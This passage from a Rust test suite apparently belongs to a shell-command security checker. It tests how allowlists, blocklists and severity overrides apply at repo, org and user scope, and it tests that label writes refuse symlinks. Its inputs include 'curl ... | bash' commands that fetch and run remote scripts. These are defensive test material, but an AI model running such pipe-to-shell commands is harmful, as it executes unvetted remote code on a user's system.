        "repo blocklist (a tightening) must still fire PolicyBlocklisted"
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_f9_repo_flat_allowlist_file_is_ignored_but_blocklist_honored() {
    // The flat-file twin of F9: `load_org_lists` reads the repo `.tirith/`
    // allowlist/blocklist text files. The repo allowlist (suppression) must be
    // ignored; the repo blocklist (tightening) must still apply.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();

    let repo = make_repo("fail_mode: open\n");
    fs::write(repo.path().join(".tirith/allowlist"), "bit.ly\n").unwrap();
    fs::write(
        repo.path().join(".tirith/blocklist"),
        "blocked-host.example.com\n",
    )
    .unwrap();
    let cwd = repo.path().to_str().unwrap();

    // allowlist must NOT suppress ShortenedUrl.
    let v1 = analyze_exec("curl https://bit.ly/install", cwd);
    assert!(
        v1.findings
            .iter()
            .any(|f| f.rule_id == RuleId::ShortenedUrl),
        "repo flat allowlist must not suppress ShortenedUrl"
    );

    // blocklist must still force a Block.
    let v2 = analyze_exec("curl https://blocked-host.example.com/x", cwd);
    assert!(
        v2.findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "repo flat blocklist must still fire PolicyBlocklisted"
    );
    assert_eq!(v2.action, Action::Block);
}

#[test]
fn test_f9_org_scope_policy_is_honored() {
    // TIRITH_POLICY_ROOT (org/CI mount) is operator-controlled: the SAME knobs
    // that are neutralized at repo scope are honored here. allowlist_rules +
    // severity_overrides must take effect → no findings → Allow.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();

    let org = TempDir::new().unwrap();
    let org_tirith = org.path().join(".tirith");
    fs::create_dir_all(&org_tirith).unwrap();
    fs::write(
        org_tirith.join("policy.yaml"),
        r#"
fail_mode: open
allowlist_rules:
  - rule_id: curl_pipe_shell
    patterns:
      - example.com/install.sh
"#,
    )
    .unwrap();

    // A non-repo cwd so the walk-up branch finds nothing and the org branch wins.
    let plain_cwd = TempDir::new().unwrap();

    // SAFETY: serialized via ENV_LOCK (held for this test).
    unsafe { std::env::set_var("TIRITH_POLICY_ROOT", org.path()) };
    let p = Policy::discover_local_only(plain_cwd.path().to_str());
    let verdict = analyze_exec(
        "curl https://example.com/install.sh | bash",
        plain_cwd.path().to_str().unwrap(),
    );
    unsafe { std::env::remove_var("TIRITH_POLICY_ROOT") };

    assert_eq!(p.scope, PolicyScope::Org, "TIRITH_POLICY_ROOT stamps Org");
    assert_eq!(
        p.allowlist_rules.len(),
        1,
        "org allowlist_rules must be honored (not sanitized)"
    );
    assert!(
        verdict
            .findings
            .iter()
            .all(|f| f.rule_id != RuleId::CurlPipeShell),
        "org-scope allowlist_rule must suppress CurlPipeShell. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| f.rule_id.to_string())
            .collect::<Vec<_>>()
    );
    assert_eq!(verdict.action, Action::Allow);
}

#[test]
fn test_f9_org_scope_allowlist_rules_case_insensitive_rule_id() {
    // Org-scope positive coverage for case-insensitive `rule_id` matching. This
    // sub-feature used to be pinned at REPO scope in `bypass_regression.rs`, but
    // F9 neutralizes a repo `allowlist_rules` regardless of casing, so those
    // tests were flipped to assert non-suppression. The case-insensitive MATCHER
    // (`is_allowlisted_for_rule`'s `eq_ignore_ascii_case`) is exercised here
    // instead: at org scope an UPPERCASE `SHORTENED_URL` rule_id must still match
    // the lowercase `ShortenedUrl` finding and suppress it.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();

    let _org = set_org_policy(
        "fail_mode: open\nallowlist_rules:\n  - rule_id: SHORTENED_URL\n    patterns:\n      - bit.ly\n",
    );
    // A non-repo cwd so the walk-up branch finds nothing and the org branch wins.
    let plain_cwd = TempDir::new().unwrap();

    let p = Policy::discover_local_only(plain_cwd.path().to_str());
    let verdict = analyze_exec(
        "curl https://bit.ly/install | bash",
        plain_cwd.path().to_str().unwrap(),
    );
    // SAFETY: serialized via ENV_LOCK (held for this test).
    unsafe { std::env::remove_var("TIRITH_POLICY_ROOT") };

    assert_eq!(p.scope, PolicyScope::Org, "TIRITH_POLICY_ROOT stamps Org");
    assert!(
        verdict
            .findings
            .iter()
            .all(|f| f.rule_id != RuleId::ShortenedUrl),
        "org-scope allowlist_rules with an uppercase rule_id must match \
         case-insensitively and suppress ShortenedUrl. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| f.rule_id.to_string())
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_f9_org_scope_severity_override_is_honored() {
    // Counterpart to `test_repo_severity_override_*`: at org scope the override
    // DOES apply.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();

    let org = TempDir::new().unwrap();
    let org_tirith = org.path().join(".tirith");
    fs::create_dir_all(&org_tirith).unwrap();
    fs::write(
        org_tirith.join("policy.yaml"),
        "severity_overrides:\n  shortened_url: CRITICAL\n",
    )
    .unwrap();
    let plain_cwd = TempDir::new().unwrap();

    // SAFETY: serialized via ENV_LOCK (held for this test).
    unsafe { std::env::set_var("TIRITH_POLICY_ROOT", org.path()) };
    let verdict = analyze_exec(
        "curl https://bit.ly/install",
        plain_cwd.path().to_str().unwrap(),
    );
    unsafe { std::env::remove_var("TIRITH_POLICY_ROOT") };

    let shortened = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::ShortenedUrl)
        .expect("ShortenedUrl should fire");
    assert_eq!(
        shortened.severity,
        Severity::Critical,
        "org-scope severity_overrides must escalate ShortenedUrl to CRITICAL"
    );
}

#[test]
fn test_f9_user_scope_allowlist_is_honored() {
    // User config (XDG_CONFIG_HOME/tirith/policy.yaml) is operator-controlled and
    // honored in full. allowlist must suppress ShortenedUrl → Allow.
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();

    let cfg = TempDir::new().unwrap();
    let tirith_cfg = cfg.path().join("tirith");
    fs::create_dir_all(&tirith_cfg).unwrap();
    fs::write(
        tirith_cfg.join("policy.yaml"),
        "fail_mode: open\nallowlist:\n  - bit.ly\n",
    )
    .unwrap();
    // Non-repo cwd so user is the matching branch.
    let plain_cwd = TempDir::new().unwrap();

    // SAFETY: serialized via ENV_LOCK (held for this test).
    unsafe { std::env::set_var("XDG_CONFIG_HOME", cfg.path()) };
    let p = Policy::discover_local_only(plain_cwd.path().to_str());
    let verdict = analyze_exec(
        "curl https://bit.ly/install",
        plain_cwd.path().to_str().unwrap(),
    );
    unsafe { std::env::remove_var("XDG_CONFIG_HOME") };

    assert_eq!(p.scope, PolicyScope::User, "user config stamps User");
    assert!(
        !p.allowlist.is_empty(),
        "user allowlist must be honored (not sanitized)"
    );
    assert_eq!(
        verdict.action,
        Action::Allow,
        "user-scope allowlist must suppress ShortenedUrl → Allow. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| f.rule_id.to_string())
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_f8_ambient_api_key_not_paired_with_repo_server_url() {
    // F8: an ambient TIRITH_API_KEY must never authenticate to a server URL that
    // came from a repo-scoped policy. The hostile repo declares a
    // policy_server_url; after discovery it must be gone (F9) and no remote fetch
    // (path is not `remote:`), so the ambient key has nothing repo-scoped to pair
    // with. (No network mock — we assert the observable sanitized state.)
    let _lock = ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
    clear_policy_env();

    let repo = make_repo(HOSTILE_POLICY_YAML);
    let cwd = repo.path().to_str().unwrap();

    // SAFETY: serialized via ENV_LOCK (held for this test).
    unsafe { std::env::set_var("TIRITH_API_KEY", "ambient-key-from-shell") };
    // Deliberately DO NOT set TIRITH_SERVER_URL: the only URL on offer is the
    // repo-planted one, which must be refused.
    let p = Policy::discover(Some(cwd));
    unsafe { std::env::remove_var("TIRITH_API_KEY") };

    assert_eq!(p.scope, PolicyScope::Repo);
    assert!(
        p.policy_server_url.is_none(),
        "repo-planted policy_server_url must not survive discovery"
    );
    let path = p.path.unwrap_or_default();
    assert!(
        !path.starts_with("remote:"),
        "ambient key must not have driven a fetch to the repo URL (path was {path})"
    );
}

// ===========================================================================
// F17 — label writes must not follow symlinks
// ===========================================================================

#[cfg(unix)]
#[test]
fn test_f17_write_label_refuses_symlinked_final_file() {
    use std::os::unix::fs::symlink;

    let repo = TempDir::new().unwrap();
    let tirith = repo.path().join(".tirith");
    fs::create_dir_all(&tirith).unwrap();

    // Pre-plant a symlink at the label path pointing at a sensitive target.
    let secret = repo.path().join("SECRET");
    fs::write(&secret, "original-secret\n").unwrap();
    let label_path = tirith.join("context-labels.yaml");
    symlink(&secret, &label_path).unwrap();

    let err = tirith_core::policy::write_context_label(&label_path, "aws:prod", "critical")
        .expect_err("writing through a symlinked label file must fail");
    // open_write_no_follow maps the symlinked final component to an error.
    assert!(
        matches!(
            err.kind(),
            std::io::ErrorKind::Other
                | std::io::ErrorKind::PermissionDenied
                | std::io::ErrorKind::InvalidInput
                | std::io::ErrorKind::AlreadyExists
        ) || err.raw_os_error().is_some(),
        "expected a refusal error, got {err:?}"
    );
    // The sensitive target must be untouched.
    assert_eq!(
        fs::read_to_string(&secret).unwrap(),
        "original-secret\n",
        "the symlink target must not have been overwritten"
    );
}

#[cfg(unix)]
#[test]
fn test_f17_write_label_refuses_symlinked_tirith_dir() {
    use std::os::unix::fs::symlink;

    // `.tirith` itself is a symlink escaping the repo root → the containment
    // guard (canonical_within against the grandparent) must reject the write.
    let repo = TempDir::new().unwrap();
    let outside = TempDir::new().unwrap();
    let symlinked_tirith = repo.path().join(".tirith");
    symlink(outside.path(), &symlinked_tirith).unwrap();

    let label_path = symlinked_tirith.join("context-labels.yaml");
    let err = tirith_core::policy::write_context_label(&label_path, "aws:prod", "critical")
        .expect_err("a symlinked .tirith dir must be rejected");
    assert_eq!(
        err.kind(),
        std::io::ErrorKind::PermissionDenied,
        "containment guard should reject with PermissionDenied, got {err:?}"
    );
    // Nothing should have been written into the escape target.
    assert!(
        !outside.path().join("context-labels.yaml").exists(),
        "no label file should have been created in the escape target"
    );
}

#[cfg(unix)]
#[test]
fn test_f17_write_label_succeeds_for_legitimate_path() {
    // The happy path still works: a real `.tirith` dir under the repo root, no
    // symlinks. Confirms the hardening didn't break normal label writes.
    let repo = TempDir::new().unwrap();
    fs::create_dir_all(repo.path().join(".git")).unwrap();
    let label_path = repo.path().join(".tirith").join("context-labels.yaml");

    tirith_core::policy::write_context_label(&label_path, "aws:prod", "critical")
        .expect("legit label write must succeed");
    let written = fs::read_to_string(&label_path).unwrap();
    assert!(
        written.contains("aws:prod") && written.contains("critical"),
        "label file should contain the written entry, got: {written}"
    );

    // A second write preserves the first entry and adds the new one (read-back
    // goes through the symlink-refusing merge).
    tirith_core::policy::write_context_label(&label_path, "gcp:prod", "production")
        .expect("second legit label write must succeed");
    let written = fs::read_to_string(&label_path).unwrap();
    assert!(
        written.contains("aws:prod") && written.contains("gcp:prod"),
        "second write must preserve the first entry, got: {written}"
    );
}
